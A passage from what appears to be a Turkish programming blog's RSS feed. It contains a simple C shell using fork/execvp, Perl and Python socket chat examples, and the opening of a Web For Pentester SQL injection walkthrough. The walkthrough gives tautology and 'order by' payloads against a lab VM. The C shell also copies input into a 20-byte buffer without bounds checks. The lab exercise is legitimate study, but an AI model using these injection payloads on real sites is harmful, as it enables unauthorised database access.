      &lt;td&gt;$program &amp;lt; dosya&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Bir programın standart çıktısını başka bir programa standart girdi olarak
yönlendirme&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$program2 &amp;gt; dosya&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Bir programın standart hata çıktısını bir dosyaya yönlendirme&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;$program &amp;gt; dosya 2&amp;gt;&amp;amp;1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Bir programın standart çıktısını ve standart hata çıktısını tek bir dosyada
birleştirme&lt;/li&gt;
&lt;/ul&gt;

</description>
      </item>
    
      <item>
        <title>C ile Basit Linux Shell</title>
        <link>http://localhost:4000/basic-linux-shell-fork-execvp</link>
        <pubDate>Sun, 19 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;p&gt;      &lt;strong&gt;C&lt;/strong&gt; dilini kullanıp basit bir &lt;strong&gt;linux shell&lt;/strong&gt; yazarak &lt;strong&gt;parent-child process&lt;/strong&gt; işleyiş mantığını anlatmaya çalıştık. Buradaki önemli fonksiyonlarımız &lt;strong&gt;fork()&lt;/strong&gt; ve &lt;strong&gt;execvp()&lt;/strong&gt; fonksiyonlarıdır.&lt;/p&gt;

&lt;p&gt;      Oluşturulan alt süreç, üst programın yaptığı gibi aynı programı çalıştırmak zorunda değildir. &lt;strong&gt;Exec&lt;/strong&gt; tipi sistem çağrıları, bir işlemi, ikili bir şekilde yürütülebilir ve herhangi bir program dosyasını çalıştırmaya izin verir. Aşağıdaki programda şöyle bir sistem çağrısı görüyoruz : &lt;strong&gt;execvp()&lt;/strong&gt;.
Execvp () sistem çağrısı iki bağımsız değişkeni gerektirir:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;İlk argüman yürütülecek bir dosyanın adını içeren bir karakter dizesidir.&lt;/li&gt;

&lt;li&gt;İkinci argüman, bir dizi karakter dizisine işaret eden bir işaretçidir. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;      Bu argümanların sıfır(&lt;strong&gt;NULL&lt;/strong&gt;) ile bitmesi gerektiğini unutmayın. Execvp() yürütüldüğünde, ilk argüman tarafından verilen program dosyası çağıranın adres alanına yüklenecek ve orada programı over-write edecektir. Ardından, ikinci argüman programa verilecek ve yürütme işlemi başlatılacaktır. Sonuç olarak, belirtilen program dosyası çalıştırılmaya başlandığında, shell üzerindeki  çalışan program gidecek ve yeni programla değiştirilecektir.&lt;/p&gt;

&lt;p&gt;      Execvp (), yürütme başarısız olursa (örn. istek dosyası mevcut değilse) negatif bir değer döndürür. Burada yaptığımız önemli işlemlerden birisi aldığımız karakter dizisindeki ifadeyi parçalara ayırıp  hangi komut çalışacak hangi dosya yollarını kullanacak bunu belirlemektir. Yani çalıştırmak istediğimiz komutun aldığı parametreleri de ayrı birer karakter dizisinde tutup işlem yaptırıyoruz.&lt;/p&gt;

&lt;h4&gt;C Kodu&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;


int main()
{

	char* i_komut[100]; 
char* ref_yol= &quot;/bin/&quot;; 
char program_yolu[20];           
int sayac;			
char *komut = (char*) malloc(100);  



printf(&quot;&amp;gt;&amp;gt;&quot;);          

while(scanf(&quot;%[^\n]%*c&quot;,komut)) 
{

size_t length = strlen(komut);   	 
if (komut[length - 1] == '\n')  
    komut[length - 1] = '\0';      





if(strcmp(komut,&quot;exit&quot;)==0)
{ 
        break;
}

if(strcmp(komut,&quot;clear&quot;)==0)
{ 
        system(&quot;clear&quot;);
}

char *token;                        
token = strtok(komut,&quot; &quot;);          
int i=0;                          

while(token!=NULL)
{
        i_komut[i]=token;      
        token = strtok(NULL,&quot; &quot;);
        i++;
	}

	i_komut[i]=NULL;                     

sayac=i;                           

for(i=0; i&amp;lt;sayac; i++)
{
        printf(&quot;%s\n&quot;, i_komut[i]);      
}

strcpy(program_yolu, ref_yol);         
strcat(program_yolu, i_komut[0]);      

for(i=0; i&amp;lt;strlen(program_yolu); i++)
{     
        if(program_yolu[i]=='\n'){           
            program_yolu[i]='\0';           
        }
}
  
int pid= fork();              

if(pid==0)
{                       
        execvp(program_yolu,i_komut);        
        fprintf(stderr, &quot;Child process baslatilamadi !\n&quot;); 
							
}
else
{                    
        wait(NULL);          
        printf(&quot;Child process çalıştı ! \n&quot;);       
}

printf(&quot;&amp;gt;&amp;gt;&quot;);

}


} 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
      </item>
    
      <item>
        <title>Client-Server Örnekleri (Perl - Python)</title>
        <link>http://localhost:4000/client-server-perl-python</link>
        <pubDate>Sat, 18 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;h3&gt;Perl Client-Server&lt;/h3&gt;

&lt;p&gt;      Burada Perl dilini kullanarak bir &lt;strong&gt;Client-Server&lt;/strong&gt; uygulaması gerçekleştirmeye çalıştık. 
Tabiki olmazsa olmaz diyerekten &lt;strong&gt;Socket&lt;/strong&gt; kütüphanesini import ediyoruz. 
&lt;strong&gt;IO::Socket::INET&lt;/strong&gt; ,AF_INET (ARPA Internet protocols) domain socketleri için nesne arayüzüdür.
Bu sınıfı kullanarak bir nesne oluşturacağız. Bu nesne constractoru içerisinde aşağıdaki
değişkenler bulunabilir.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;1. PeerAddr &lt;/li&gt;
&lt;li&gt;2. PeerHost &lt;/li&gt;
&lt;li&gt;3. PeerPort &lt;/li&gt;
&lt;li&gt;4. LocalAddr &lt;/li&gt;
&lt;li&gt;5. LocalHost &lt;/li&gt;
&lt;li&gt;6. LocalPort &lt;/li&gt;
&lt;li&gt;7. Proto &lt;/li&gt;
&lt;li&gt;8. Type &lt;/li&gt;
&lt;li&gt;9. Listen &lt;/li&gt;
&lt;li&gt;10. ReuseAddr &lt;/li&gt;
&lt;li&gt;11. Reuse &lt;/li&gt;
&lt;li&gt;12. ReusePort &lt;/li&gt;
&lt;li&gt;13. Broadcast &lt;/li&gt;
&lt;li&gt;14. Timeout &lt;/li&gt;
&lt;li&gt;15. MultiHomed &lt;/li&gt;
&lt;li&gt;16. Blocking &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Biz buradan :&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;LocalHost&lt;/strong&gt; : Yerel makina bağlantı adresi&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;LocalPort&lt;/strong&gt; : Yerel makina bağlantı portu&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Proto&lt;/strong&gt;     : Bağlanti Protolü&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Listen&lt;/strong&gt;   :	Dinlemek için queue boyutu&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;PeerAddr&lt;/strong&gt;  : Uzak makina bağlantı adresi&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;PeerPort&lt;/strong&gt;  : Uzak makine bağlantı portu&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;değişkenlerini kullanacağız.&lt;/p&gt;

&lt;p&gt;      Bağlantı kurulacak port numarasını dışarıdan input olarak alınmasını belirledik fakat 
genelde yüksek numaralı portlar tercih edilir.&lt;/p&gt;

&lt;p&gt;      Uygulama basit bir yazışma uygulaması olarak düşünülebilir. Karşı taraf için bir socket
tanımlayıp  bağlantı beklenmeye başlanır . Bu socket karşı tarafın adresini ve port numarasını 
içerir. Bağlantı sağlanınca devamında ‘basit’ yazışma kanalına girilir. Burada önce server 
tarafı ve sonra client tarafı yazmak koşuluyla iletişim sağlanır.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Server Kısmı&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;vg&quot;&gt;$|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Port numarası giriniz...\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;&amp;lt;STDIN&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::Socket::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;INET&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;LocalHost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;LocalPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;Proto&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'tcp'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;Listen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;die&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Port açılamadı!&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Bağlantı bekleniyor...Port : $port\n &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$peer_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;peerhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$peer_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;peerport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

    	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\n CTRL Chat Server'a  Bağlantı Kuruldu. ( $peer_address , $peer_port ) \n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$giden_veri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;&amp;lt;STDIN&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hakan: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$giden_veri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$gelen_veri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gelen_veri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$client_socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;autoflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; 

    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      &lt;strong&gt;Client&lt;/strong&gt; tarafı için yine aynı şekilde bir socket nesnesi oluşturuyoruz. &lt;strong&gt;PeerAddr&lt;/strong&gt; olarak görünen yer
server adresidir. &lt;strong&gt;PeerPort&lt;/strong&gt; ise server’ın hangi portundan bağlantı sağlanacağıdır. Burada yine
dışarıdan port numarasını input alarak ilerledik.Aynı port numarası girildiğinde 
bağlantı sağlanır. Bağlantı kurulunca yazışma kanalına geçilir ve belirtilen 
kurallar dahilinde  iletişim sağlanabilir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Client Kısmı&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Port numarası giriniz...\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;&amp;lt;STDIN&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::Socket::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;INET&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;PeerAddr&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;PeerPort&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;Proto&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'tcp'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;die&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Bağlantı Kurulamadı !\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$gelen_veri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gelen_veri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$giden_veri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;&amp;lt;STDIN&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Kullanici : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;nv&quot;&gt;$socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$giden_veri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3&gt;Python Client-Server&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Server Kısmı&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import socket
import socketserver
import threading 

class threadexample (threading.Thread): 
   		def __init__(self, threadID, name):
   			threading.Thread.__init__(self)
   			self.threadID=threadID
   			self.name = name
   		def run(self):
   			while True:
     		a=baglanti.recv(1000)
     		print(a.decode())
   
class threadexample2 (threading.Thread):
   		def __init__(self, threadID, name):        
    		threading.Thread.__init__(self)
    		self.threadID=threadID
    		self.name = name
   		def run(self): 
   			while True:
       		a=input(&quot;Server: &quot;) 
       		baglanti.send(a.encode())


myserver=socket.socket()
mylocal=socket.gethostname()

myserver.bind((mylocal,3969))
myserver.listen(5)

while True:
		baglanti, adress = myserver.accept()
		print(&quot;Bağlantı Sağlandi...&quot;  )
		print(adress)
		thread1=threadexample(1,&quot;recv&quot;)
		thread1.start()
		thread1=threadexample2(2,&quot;send&quot;)
		thread1.start()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Client Kısmı&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import socket
import sys
import threading

class threadexample (threading.Thread):
		def __init__(self, threadID, name):        
    		threading.Thread.__init__(self)
    		self.threadID=threadID
    		self.name = name
		def run(self):
    		while True:
      		a=mysocket.recv(1000)
      		print(a.decode())
    
class threadexample2 (threading.Thread):
		def __init__(self, threadID, name):    
     		threading.Thread.__init__(self)
     		self.threadID=threadID
     		self.name = name
		def run(self):        
    		while True:
        		a=input(&quot;Client: &quot;)
        		mysocket.send(a.encode())


mysocket=socket.socket()

#host=&quot;0x6cac60.github.io&quot;
#addres=socket.gethostbyname(host)
mylocal=socket.gethostname()
port=3969

mysocket.connect((mylocal,port))
a=&quot;selam&quot;.encode()
mysocket.send(a)
#while True: 
thread1=threadexample(1,&quot;recv&quot;)
thread2=threadexample2(3,&quot;sxend&quot;)
thread1.start()
thread2.start()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Bu konu literatürde &lt;strong&gt;socket programlama&lt;/strong&gt; olarakta geçer.Bu yazışma programı Socket programlama 
kapsamında basit bir &lt;strong&gt;Client-Server&lt;/strong&gt; uygulamasıdır.&lt;/p&gt;

</description>
      </item>
    
      <item>
        <title>WEB For Pentester 1 - SQL Injections Bölümü Çözümleri</title>
        <link>http://localhost:4000/wfp1-sql-injection-cozumleri</link>
        <pubDate>Fri, 17 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;p&gt;      &lt;strong&gt;Web For Pentester&lt;/strong&gt; yaygın Web zafiyetlerini bize sunan ve bu zafiyetlerden yararlanmaya çalışarak çözümlere ulaştığımız
bir test sistemidir. Bu adresten bilgisayarınıza indirebilirsiniz.&lt;a href=&quot;https://www.pentesterlab.com/exercises/web_for_pentester&quot;&gt;Bu&lt;/a&gt; adresten bilgisayarınıza indirebilirsiniz.
ISO kalıbı bilgisayarınıza indikten sonra Vmware,Virtual Machine gibi sanal makina sistemlerinden birine kurmanız gerekir. Kurulumdan sonra sanal makinenizdeki sistem de&lt;/p&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;&lt;strong&gt;»ifconfig&lt;/strong&gt;&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;yazarak gördüğünüz IP adresini Ana makinenizdeki tarayıcınıza yazarak &lt;strong&gt;WFP&lt;/strong&gt; sorularına ulaşabilirsiniz.
Bu yazıda &lt;strong&gt;SQL Injections&lt;/strong&gt; Bölümünün çözümlerini anlatmaya çalışacağız.Syntax yapısını sağlamak için gereken  URL encode karakterlerine de
&lt;a href=&quot;https://www.w3schools.com/tags/ref_urlencode.asp&quot;&gt;şurayı&lt;/a&gt;	ziyaret ederek ulaşabilirsiniz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example 1&lt;/strong&gt;&lt;br /&gt;
      Soruda tırnak (‘) koyup deneme yaptığımızda ekranın bir hatadan dolayı değiştiğini görüyoruz. Buradan araya kod sıkıştırabileceğimizi anlıyoruz.  Örnek olarak arka tarafta çalışan sorgu:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. select id,name,age from users where name='root'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Buraya şu ifadeyi eklediğimizde&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. select id,name,age from users where name='root' or 1 or''
2. select id,name,age from users where 1 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;İkinci  duruma geldiğini düşünebiliriz. Bununla bütün değerleri çağırmış oluyoruz ve listeliyoruz.
‘or 1 or’ ifadesini aşağıdaki gibi URL’ye eklediğimizde tüm tabloyu listeliyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=root'or 1 or'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Burada çıkan kullanıcıları ve bilgileri görüyoruz. Örneğin user1 ile devam edelim. Buraya yazdığımız kelime sonucu etkilemez. Önümüzdeki tabloda kaç tane sütun olduğunu aşağıdaki komutla deneyerek buluyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=user1' order by 1 %23
2. http://192.168.96.129/sqli/example1.php?name=user1' order by 2 %23
3. http://192.168.96.129/sqli/example1.php?name=user1' order by 3 %23
4. http://192.168.96.129/sqli/example1.php?name=user1' order by 4 %23
5. http://192.168.96.129/sqli/example1.php?name=user1' order by 5 %23
6. http://192.168.96.129/sqli/example1.php?name=user1' order by 6 %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

